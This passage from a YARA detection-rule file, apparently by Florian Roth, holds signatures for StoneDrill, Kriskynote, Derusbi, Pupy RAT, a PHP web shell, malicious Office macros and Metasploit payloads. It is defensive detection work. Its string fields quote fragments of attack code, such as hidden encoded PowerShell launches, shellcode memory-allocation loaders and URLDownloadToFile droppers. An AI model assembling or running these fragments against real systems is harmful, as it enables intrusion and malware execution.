      $s7 = "Global\\{1374821A-281B-9AF4-%04X-12345678901234}" fullword ascii
      $s8 = "2004-2013 Passcape Software" fullword wide
      $s9 = "Global\\Passcape#6712%04X" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )
} 

rule WPR_WindowsPasswordRecovery_EXE_RID3337 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Windows Password Recovery - file wpr.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15 14:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "UuPipe" fullword ascii
      $x2 = "dbadllgl" fullword ascii
      $x3 = "UkVHSVNUUlkgTU9O" fullword ascii
      $x4 = "RklMRSBNT05JVE9SIC0gU1l" fullword ascii
      $s1 = "WPR.exe" fullword wide
      $s2 = "Windows Password Recovery" fullword wide
      $op0 = { 5f df 27 17 89 } 
      $op1 = { 5f 00 00 f2 e5 cb 97 } 
      $op2 = { e8 ed 00 f0 cc e4 00 a0 17 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20000KB and ( 1 of ( $x* ) or all of ( $s* ) or all of ( $op* ) )
} 

rule WPR_WindowsPasswordRecovery_EXE_64_RID3400 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Windows Password Recovery - file ast64.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15 15:11:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%B %d %Y  -  %H:%M:%S" fullword wide
      $op0 = { 48 8d 8c 24 50 22 00 00 e8 bf eb ff ff 4c 8b c7 } 
      $op1 = { ff 15 16 25 01 00 f7 d8 1b } 
      $op2 = { e8 c2 26 00 00 83 20 00 83 c8 ff 48 8b 5c 24 30 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule PowerShell_Susp_Parameter_Combo_RID336F : ANOMALY DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects PowerShell invocation with suspicious parameters"
      author = "Florian Roth"
      reference = "https://goo.gl/uAic1X"
      date = "2017-03-12 14:47:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      
      type = "file"
      tags = "ANOMALY, DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $sa1 = " -enc " ascii nocase
      $sa2 = " -EncodedCommand " ascii nocase
      $sb1 = " -w hidden " ascii nocase
      $sb2 = " -window hidden " ascii nocase
      $sb3 = " -windowstyle hidden " ascii nocase
      $sc1 = " -nop " ascii nocase
      $sc2 = " -noprofile " ascii nocase
      $sd1 = " -noni " ascii nocase
      $sd2 = " -noninteractive " ascii nocase
      $se1 = " -ep bypass " ascii nocase
      $se2 = " -exec bypass " ascii nocase
      $se3 = " -executionpolicy bypass " ascii nocase
      $se4 = " -exec bypass " ascii nocase
      $sf1 = " -sta " ascii
      $fp1 = "Chocolatey Software" 
      $fp2 = "VBOX_MSI_INSTALL_PATH" 
   condition: 
      filesize < 3000KB and 4 of ( $s* ) and not 1 of ( $fp* )
} 

rule StoneDrill_BAT_1_RID2CD7 : APT DEMO FILE MIDDLE_EAST T1136 {
   meta:
      description = "Rule to detect Batch file from StoneDrill report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 10:06:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "set u100=" ascii
      $s2 = "set u200=service" ascii fullword
      $s3 = "set u800=%~dp0" ascii fullword
      $s4 = "\"%systemroot%\\system32\\%u100%\"" ascii
      $s5 = "%\" start /b %systemroot%\\system32\\%" ascii
   condition: 
      uint32 ( 0 ) == 0x68636540 and 2 of them and filesize < 500
} 

rule StoneDrill_Service_Install_RID3177 : APT DEMO MIDDLE_EAST T1035 T1136 {
   meta:
      description = "Rule to detect Batch file from StoneDrill report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 13:23:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, MIDDLE_EAST, T1035, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "127.0.0.1 >nul && sc config" ascii
      $s2 = "LocalService\" && ping -n" ascii fullword
      $s3 = "127.0.0.1 >nul && sc start" ascii fullword
      $s4 = "sc config NtsSrv binpath= \"C:\\WINDOWS\\system32\ntssrvr64.exe" ascii
   condition: 
      2 of them and filesize < 500
} 

rule StoneDrill_ntssrvr32_RID2EF7 : APT DEMO EXE FILE MIDDLE_EAST T1136 {
   meta:
      description = "Detects malware from StoneDrill threat report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 11:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "g\\system32\\" fullword wide
      $s2 = "ztvttw" fullword wide
      $s3 = "lwizvm" fullword ascii
      $op1 = { 94 35 77 73 03 40 eb e9 } 
      $op2 = { 80 7c 41 01 00 74 0a 3d } 
      $op3 = { 74 0a 3d 00 94 35 77 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )
} 

rule StoneDrill_Malware_2_RID2ECA : APT DEMO EXE FILE MAL MIDDLE_EAST T1047 T1136 {
   meta:
      description = "Detects malware from StoneDrill threat report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 11:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd /c WMIC Process Call Create \"C:\\Windows\\System32\\Wscript.exe //NOLOGO " fullword wide
      $s2 = "C:\\ProgramData\\InternetExplorer" fullword wide
      $s3 = "WshShell.CopyFile \"" fullword wide
      $s4 = "Abd891.tmp" fullword wide
      $s5 = "Set WshShell = Nothing" fullword wide
      $s6 = "AaCcdDeFfGhiKLlMmnNoOpPrRsSTtUuVvwWxyZz32" fullword ascii
      $s7 = "\\FileInfo.txt" fullword wide
      $x1 = "C-PDI-C-Cpy-T.vbs" fullword wide
      $x2 = "C-Dlt-C-Org-T.vbs" fullword wide
      $x3 = "C-PDC-C-Cpy-T.vbs" fullword wide
      $x4 = "AC-PDC-C-Cpy-T.vbs" fullword wide
      $x5 = "C-Dlt-C-Trsh-T.tmp" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or 5 of them
} 

rule StoneDrill_RID2B11 : APT DEMO EXE FILE MIDDLE_EAST T1136 {
   meta:
      description = "Detects malware from StoneDrill_RID2B11 threat report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 08:50:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C-Dlt-C-Trsh-T.tmp" fullword wide
      $x2 = "C-Dlt-C-Org-T.vbs" fullword wide
      $s1 = "Hello dear" fullword ascii
      $s2 = "WRZRZRAR" fullword ascii
      $opa1 = { 66 89 45 d8 6a 64 ff } 
      $opa2 = { 8d 73 01 90 0f bf 51 fe } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) or ( all of ( $op* ) and all of ( $s* ) )
} 

rule StoneDrill_VBS_1_RID2CEB : APT DEMO MIDDLE_EAST SCRIPT T1136 {
   meta:
      description = "Detects malware from StoneDrill threat report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 10:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, MIDDLE_EAST, SCRIPT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "wmic /NameSpace:\\\\root\\default Class StdRegProv Call SetStringValue hDefKey = \"&H80000001\" sSubKeyName = \"Software\\Micros" ascii
      $x2 = "ping 1.0.0.0 -n 1 -w 20000 > nul" fullword ascii
      $s1 = "WshShell.CopyFile \"%COMMON_APPDATA%\\Chrome\\" ascii
      $s2 = "WshShell.DeleteFile \"%temp%\\" ascii
      $s3 = "WScript.Sleep(10 * 1000)" fullword ascii
      $s4 = "Set WshShell = CreateObject(\"Scripting.FileSystemObject\") While WshShell.FileExists(\"" ascii
      $s5 = " , \"%COMMON_APPDATA%\\Chrome\\" ascii
   condition: 
      ( filesize < 1KB and 1 of ( $x* ) or 2 of ( $s* ) )
} 

rule Kriskynote_Mar17_2_RID2DBC : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Kriskynote Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-03 10:44:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "fgjfcn8456fgjhfg89653wetwts" fullword ascii
      $op0 = { 33 c0 80 34 30 03 40 3d e6 21 00 00 72 f4 b8 e6 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )
} 

rule Derusbi_Backdoor_Mar17_1_RID2FDA : DEMO EXE FILE MAL T1085 T1136 {
   meta:
      description = "Detects a variant of the Derusbi backdoor"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-03 12:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%SystemRoot%\\System32\\wiaservc.dll" fullword wide
      $x2 = "c%WINDIR%\\PCHealth\\HelpCtr\\Binaries\\pchsvc.dll" fullword wide
      $x3 = "%Systemroot%\\Help\\perfc009.dat" fullword wide
      $x4 = "rundll32.exe \"%s\", R32 %s" fullword wide
      $x5 = "OfficeUt32.dll" fullword ascii
      $x6 = "\\\\.\\pipe\\usb%so" fullword wide
      $x7 = "\\\\.\\pipe\\usb%si" fullword wide
      $x8 = "\\tmp1.dat" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )
} 

rule Kriskynote_Mar17_1_RID2DBB : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Kriskynote Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-03 10:44:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "gzwrite64" fullword ascii
      $opa1 = { e8 6b fd ff ff 83 f8 ff 74 65 83 7b 28 00 74 42 } 
      $opb1 = { 8a 04 08 8b 8e a4 16 00 00 88 44 24 0c 66 c7 04 } 
      $opb2 = { 89 4e 6c 89 46 74 e9 ad fc ff ff 8b 46 68 85 c0 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and ( $opa1 or all of ( $opb* ) )
} 

rule Kriskynote_Mar17_3_RID2DBD : DEMO EXE FILE MAL T1085 T1136 {
   meta:
      description = "Detects Kriskynote Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-03 10:44:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "rundll32 %s Check" fullword ascii
      $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs" fullword ascii
      $s3 = "name=\"IsUserAdmin\"" fullword ascii
      $s4 = "zok]\\\\\\ZZYYY666564444" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )
} 

rule PHP_Webshell_1_Feb17_RID2DF2 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a simple cloaked PHP web shell"
      author = "Florian Roth"
      reference = "https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127"
      date = "2017-02-28 10:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "<?php ${\"\\x" ascii
      $x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
      $x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
      $x3 = "]}[\"\x64\"]);}}echo " ascii
      $x4 = "\"=>@phpversion(),\"\\x" ascii
      $s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
      $s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them
} 

rule WordDoc_PowerShell_URLDownloadToFile_RID34F4 : DEMO FILE MAL SCRIPT T1086 T1136 {
   meta:
      description = "Detects Word Document with PowerShell URLDownloadToFile"
      author = "Florian Roth"
      reference = "https://www.arbornetworks.com/blog/asert/additional-insights-shamoon2/"
      date = "2017-02-23 15:52:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $w1 = "Microsoft Forms 2.0 CommandButton" fullword ascii
      $w2 = "Microsoft Word 97-2003 Document" fullword ascii
      $p1 = "powershell.exe" fullword ascii
      $p2 = "URLDownloadToFile" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and 1 of ( $w* ) and all of ( $p* ) )
} 

rule APT_PupyRAT_PY_RID2BF2 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Pupy RAT"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations"
      date = "2017-02-17 09:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "reflective_inject_dll" fullword ascii
      $x2 = "ImportError: pupy builtin module not found !" fullword ascii
      $x3 = "please start pupy from either it's exe stub or it's reflective DLLR;" fullword ascii
      $x4 = "[INJECT] inject_dll." fullword ascii
      $x5 = "import base64,zlib;exec zlib.decompress(base64.b64decode('eJzzcQz1c/ZwDbJVT87Py0tNLlHnAgA56wXS'))" fullword ascii
      $op1 = { 8b 42 0c 8b 78 14 89 5c 24 18 89 7c 24 14 3b fd } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20000KB and 1 of them ) or ( 2 of them )
} 

rule APT_MagicHound_MalMacro_RID2F9F : APT DEMO FILE G0059 T1086 T1136 T1193 T1203 {
   meta:
      description = "Detects malicious macro / powershell in Office document"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations"
      date = "2017-02-17 12:05:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0059, T1086, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "powershell.exe " fullword ascii
      $s2 = "CommandButton1_Click" fullword ascii
      $s3 = "URLDownloadToFile" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 8000KB and all of them )
} 

rule ShellCrew_StreamEx_1_RID2EB2 : APT DEMO EXE FILE G0009 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar"
      date = "2017-02-10 11:25:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0009, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "cmd.exe /c  \"%s\"" fullword wide
      $s3 = "uac\\bin\\install_test.pdb" fullword ascii
      $s5 = "uncompress error:%d %s" fullword ascii
      $s7 = "%s\\AdobeBak\\Proc.dat" fullword wide
      $s8 = "e:\\workspace\\boar" fullword ascii
      $s12 = "$\\data.ini" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 4 of them )
} 

rule ShellCrew_StreamEx_1_msi_RID305A : APT DEMO EXE FILE G0009 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file msi.dll"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar"
      date = "2017-02-10 12:36:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0009, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "msi.dll.eng" fullword wide
      $s2 = "ahinovx" fullword ascii
      $s3 = "jkpsxy47CDEMNSTYbhinqrwx56" fullword ascii
      $s4 = "PVYdejmrsy12" fullword ascii
      $s6 = "FLMTUZaijkpsxy45CD" fullword ascii
      $s7 = "afhopqvw34ABIJOPTYZehmo" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 3 of them )
} 

rule ShellCrew_StreamEx_1_msi_dll_RID31F5 : APT DEMO FILE G0009 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file msi.dll.eng"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar"
      date = "2017-02-10 13:44:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0009, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "NDOGDUA" fullword ascii
      $s2 = "NsrdsrN" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x4d9d and filesize < 300KB and all of them )
} 

rule Msfpayloads_msf_RID2D39 : APT DEMO FILE T1136 {
   meta:
      description = "Metasploit Payloads - file msf.sh"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "export buf=\\" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7865 and filesize < 4KB and ( 10 of ( $s* ) ) ) or ( all of them )
} 

rule Msfpayloads_msf_2_RID2DCA : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf.asp"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "& \"\\\" & \"svchost.exe\"" fullword ascii
      $s2 = "CreateObject(\"Wscript.Shell\")" fullword ascii
      $s3 = "<% @language=\"VBScript\" %>" fullword ascii
   condition: 
      all of them
} 

rule Msfpayloads_msf_psh_RID2EE3 : APT DEMO T1086 T1136 {
   meta:
      description = "Metasploit Payloads - file msf-psh.vba"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 11:33:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "powershell.exe -nop -w hidden -e" ascii
      $s2 = "Call Shell(" fullword ascii
      $s3 = "Sub Workbook_Open()" fullword ascii
   condition: 
      all of them
} 

rule Msfpayloads_msf_exe_2_RID2F6B : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf-exe.aspx"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 11:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "= new System.Diagnostics.Process();" fullword ascii
      $x2 = ".StartInfo.UseShellExecute = true;" fullword ascii
      $x3 = ", \"svchost.exe\");" ascii
      $s4 = " = Path.GetTempPath();" ascii
   condition: 
      all of them
} 

rule Msfpayloads_msf_5_RID2DCD : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf.msi"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "required to install Foobar 1.0." fullword ascii
      $s2 = "Copyright 2009 The Apache Software Foundation." fullword wide
      $s3 = "{50F36D89-59A8-4A40-9689-8792029113AC}" fullword ascii
   condition: 
      all of them
} 

rule Msfpayloads_msf_7_RID2DCF : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf.vba"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal" ascii
      $s2 = "= VirtualAlloc(0, UBound(Tsw), &H1000, &H40)" fullword ascii
      $s3 = "= RtlMoveMemory(" ascii
   condition: 
      all of them
} 

rule Msfpayloads_msf_cmd_RID2ECC : APT DEMO T1086 T1136 {
   meta:
      description = "Metasploit Payloads - file msf-cmd.ps1"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e" ascii
   condition: 
      all of them
} 

rule Msfpayloads_msf_svc_RID2EE4 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Metasploit Payloads - file msf-svc.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 11:33:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "PAYLOAD:" fullword ascii
      $s2 = ".exehll" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )
} 

rule Msfpayloads_msf_exe_RID2EDA : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf-exe.vba"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 11:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "'* PAYLOAD DATA" fullword ascii
      $s2 = " = Shell(" ascii
      $s3 = "= Environ(\"USERPROFILE\")" fullword ascii
      $s4 = "'**************************************************************" fullword ascii
      $s5 = "ChDir (" fullword ascii
      $s6 = "'* MACRO CODE" fullword ascii
   condition: 
      4 of them
} 

rule Msfpayloads_msf_3_RID2DCB : APT DEMO T1086 T1136 {
   meta:
      description = "Metasploit Payloads - file msf.psh"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(" ascii
      $s2 = "public enum MemoryProtection { ExecuteReadWrite = 0x40 }" fullword ascii
      $s3 = ".func]::VirtualAlloc(0," 
      $s4 = ".func+AllocationType]::Reserve -bOr [" ascii
      $s5 = "New-Object System.CodeDom.Compiler.CompilerParameters" fullword ascii
      $s6 = "ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" fullword ascii
      $s7 = "public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }" fullword ascii
      $s8 = ".func]::CreateThread(0,0,$" fullword ascii
      $s9 = "public enum Time : uint { Infinite = 0xFFFFFFFF }" fullword ascii
      $s10 = "= [System.Convert]::FromBase64String(\"/" ascii
      $s11 = "{ $global:result = 3; return }" fullword ascii
   condition: 
      4 of them
} 

rule Msfpayloads_msf_4_RID2DCC : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf.aspx"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "= VirtualAlloc(IntPtr.Zero,(UIntPtr)" ascii
      $s2 = ".Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);" ascii
      $s3 = "[System.Runtime.InteropServices.DllImport(\"kernel32\")]" fullword ascii
      $s4 = "private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;" fullword ascii
      $s5 = "private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);" fullword ascii
   condition: 
      4 of them
} 

rule Msfpayloads_msf_6_RID2DCE : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf.vbs"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
      $s2 = "= CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s3 = ".GetSpecialFolder(2)" ascii
      $s4 = ".Write Chr(CLng(\"" ascii
      $s5 = "= \"4d5a90000300000004000000ffff00" ascii
      $s6 = "For i = 1 to Len(" ascii
      $s7 = ") Step 2" ascii
   condition: 
      5 of them
} 

rule Msfpayloads_msf_8_RID2DD0 : APT DEMO T1086 T1136 {
   meta:
      description = "Metasploit Payloads - file msf.ps1"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii
      $s2 = "[DllImport(\"msvcrt.dll\")]" fullword ascii
      $s3 = "-Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii
      $s4 = "::VirtualAlloc(0,[Math]::Max($" ascii
      $s5 = ".Length,0x1000),0x3000,0x40)" ascii
      $s6 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii
      $s7 = "::memset([IntPtr]($" ascii
   condition: 
      6 of them
} 

rule Msfpayloads_msf_9_RID2DD1 : APT DEMO FILE T1136 {
   meta:
      description = "Metasploit Payloads - file msf.war - contents"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:48:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1)" fullword ascii
      $s2 = ".concat(\".exe\");" fullword ascii
      $s3 = "[0] = \"chmod\";" ascii
      $s4 = "= Runtime.getRuntime().exec(" ascii
      $s5 = ", 16) & 0xff;" ascii
      $x1 = "4d5a9000030000000" ascii
   condition: 
      4 of ( $s* ) or ( uint32 ( 0 ) == 0x61356434 and $x1 at 0 )
} 

rule Msfpayloads_msf_10_RID2DF9 : APT DEMO EXE FILE {
   meta:
